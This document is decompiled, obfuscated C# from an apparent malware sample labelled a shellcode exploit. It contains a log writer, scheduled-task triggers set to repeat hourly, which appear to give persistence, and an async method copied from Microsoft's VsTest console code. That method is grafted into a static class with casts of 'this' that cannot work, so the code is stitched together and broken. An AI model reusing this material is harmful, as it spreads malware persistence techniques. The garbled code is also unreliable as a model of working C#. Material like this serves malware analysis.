// Decompiled with JetBrains decompiler
// Type: 582573968022.Core.254299357263
// Assembly: 582573968022, Version=15.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 22949299-4A50-46F6-851E-C2A296093D37
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-35a63266858befa3a9a9f8f0684d53a6905ab1fbfd8df949e6989c20107cc290.exe

using \u003033954469293;
using \u003081605011334;
using \u003582573968022.Core;
using \u003582573968022.Utils;
using Microsoft.VisualStudio.TestPlatform.ObjectModel;
using Microsoft.Win32.TaskScheduler;
using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;

namespace \u003582573968022.Core
{
  public static class \u003254299357263
  {
    public static void \u003484479181066()
    {
      System.IO.File.WriteAllText(Path.Combine(\u003685140021025.\u003153468620506(), "last-run.log"), string.Format("{0}{1}{1}", (object) DateTime.Now, (object) Environment.NewLine));
      \u003265934628062.\u003566749427330();
      \u003615689892570.\u003537761177312();
    }

    private static TimeTrigger \u003395510924269()
    {
      TimeTrigger timeTrigger = new TimeTrigger();
      ((Trigger) timeTrigger).StartBoundary = new DateTime(2017, 1, 1);
      ((Trigger) timeTrigger).Repetition.Interval = TimeSpan.FromHours(1.0);
      ((Trigger) timeTrigger).Repetition.StopAtDurationEnd = false;
      ((Trigger) timeTrigger).Enabled = true;
      return timeTrigger;
    }

    private static TimeTrigger \u003859565444741()
    {
      DateTime dateTime = DateTime.Now.AddDays(1.0);
      return new TimeTrigger(new DateTime(dateTime.Year, dateTime.Month, dateTime.Day, 0, 0, 1));
    }

    private void \u003192769233978()
    {
      // ISSUE: reference to a compiler-generated field
      int num1 = ((\u003451385565438) this).\u003918466689818;
      // ISSUE: reference to a compiler-generated field
      \u003088539235942 obj = ((\u003088539235942.\u003028876633943) this).\u003305661713883;
      int result1;
      try
      {
        switch (num1)
        {
          case 0:
          case 1:
            try
            {
              TaskAwaiter awaiter1;
              int num2;
              TaskAwaiter<bool> awaiter2;
              switch (num1)
              {
                case 0:
                  // ISSUE: reference to a compiler-generated field
                  awaiter1 = ((\u003088539235942.\u003028876633943) this).\u003679085374192;
                  // ISSUE: reference to a compiler-generated field
                  ((\u003088539235942.\u003028876633943) this).\u003679085374192 = new TaskAwaiter();
                  // ISSUE: reference to a compiler-generated field
                  ((\u003451385565438) this).\u003918466689818 = num2 = -1;
                  break;
                case 1:
                  // ISSUE: reference to a compiler-generated field
                  awaiter2 = ((\u003088539235942.\u003028876633943) this).\u003102507254478;
                  // ISSUE: reference to a compiler-generated field
                  ((\u003088539235942.\u003028876633943) this).\u003102507254478 = new TaskAwaiter<bool>();
                  // ISSUE: reference to a compiler-generated field
                  ((\u003451385565438) this).\u003918466689818 = num2 = -1;
                  goto label_13;
                default:
                  // ISSUE: reference to a compiler-generated field
                  ((\u003088539235942.\u003028876633943) this).\u003233699108457 = obj.\u003916059367076.HostServer(new IPEndPoint(IPAddress.Loopback, 0)).Port;
                  // ISSUE: reference to a compiler-generated field
                  CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(((\u003088539235942.\u003028876633943) this).\u003629314944427);
                  // ISSUE: reference to a compiler-generated method
                  awaiter1 = Task.Run(new Func<Task>(obj.\u003448075831974), cancellationTokenSource.Token).GetAwaiter();
                  if (!awaiter1.IsCompleted)
                  {
                    // ISSUE: reference to a compiler-generated field
                    ((\u003451385565438) this).\u003918466689818 = num2 = 0;
                    // ISSUE: reference to a compiler-generated field
                    ((\u003088539235942.\u003028876633943) this).\u003679085374192 = awaiter1;
                    // ISSUE: reference to a compiler-generated field
                    // ISSUE: cast to a reference type
                    ((\u003088539235942.\u003028876633943) this).\u003047308261208.AwaitUnsafeOnCompleted<TaskAwaiter, \u003088539235942.\u003028876633943>(ref awaiter1, (\u003088539235942.\u003028876633943&) this);
                    return;
                  }
                  break;
              }
              awaiter1.GetResult();
              awaiter2 = obj.\u003307347259411().GetAwaiter();
              if (!awaiter2.IsCompleted)
              {
                // ISSUE: reference to a compiler-generated field
                ((\u003451385565438) this).\u003918466689818 = num2 = 1;
                // ISSUE: reference to a compiler-generated field
                ((\u003088539235942.\u003028876633943) this).\u003102507254478 = awaiter2;
                // ISSUE: reference to a compiler-generated field
                // ISSUE: cast to a reference type
                ((\u003088539235942.\u003028876633943) this).\u003047308261208.AwaitUnsafeOnCompleted<TaskAwaiter<bool>, \u003088539235942.\u003028876633943>(ref awaiter2, (\u003088539235942.\u003028876633943&) this);
                return;
              }
label_13:
              bool result2 = awaiter2.GetResult();
              obj.\u003702637470480 = result2;
              obj.\u003070142719045.Set();
            }
            catch (Exception ex)
            {
              EqtTrace.Error("VsTestConsoleRequestSender.InitializeCommunicationAsync: Error initializing communication with VstestConsole: {0}", new object[1]
              {
                (object) ex
              });
              obj.\u003070142719045.Set();
            }
            if (EqtTrace.IsInfoEnabled)
              EqtTrace.Info("VsTestConsoleRequestSender.InitializeCommunicationAsync: Ended.");
            // ISSUE: reference to a compiler-generated field
            result1 = obj.\u003702637470480 ? ((\u003088539235942.\u003028876633943) this).\u003233699108457 : -1;
            break;
          default:
            if (EqtTrace.IsInfoEnabled)
            {
              // ISSUE: reference to a compiler-generated field
              EqtTrace.Info(string.Format("VsTestConsoleRequestSender.InitializeCommunicationAsync: Started with client connection timeout {0} milliseconds.", (object) ((\u003088539235942.\u003028876633943) this).\u003629314944427));
            }
            obj.\u003113888560269 = new CancellationTokenSource();
            obj.\u003702637470480 = false;
            obj.\u003070142719045.Reset();
            // ISSUE: reference to a compiler-generated field
            ((\u003088539235942.\u003028876633943) this).\u003233699108457 = -1;
            goto case 0;
        }
      }
      catch (Exception ex)
      {
        // ISSUE: reference to a compiler-generated field
        ((\u003451385565438) this).\u003918466689818 = -2;
        // ISSUE: reference to a compiler-generated field
        ((\u003088539235942.\u003028876633943) this).\u003047308261208.SetException(ex);
        return;
      }
      // ISSUE: reference to a compiler-generated field
      ((\u003451385565438) this).\u003918466689818 = -2;
      // ISSUE: reference to a compiler-generated field
      ((\u003088539235942.\u003028876633943) this).\u003047308261208.SetResult(result1);
    }
  }
}
